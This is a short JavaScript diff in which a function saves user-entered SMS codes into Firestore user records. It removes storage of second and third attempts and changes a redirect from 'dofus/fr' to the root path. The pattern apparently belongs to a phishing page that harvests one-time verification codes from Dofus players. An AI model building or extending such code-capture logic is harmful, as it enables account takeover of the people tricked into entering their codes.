@@ -57,18 +57,8 @@ const send2 = async(e)=>{
   await updateDoc(document, {
       sms: code
   });
-  }else if(count === 1){
-    const document = doc(db, "users", uid);
-    await updateDoc(document, {
-        sms2: code
-    });
-  }else if(count === 2){
-    const document = doc(db, "users", uid);
-    await updateDoc(document, {
-        sms3: code
-    });
   }else{
-    Router("dofus/fr");
+    Router("/");
   }
   setCount(prev => prev + 1);
   setCode("");
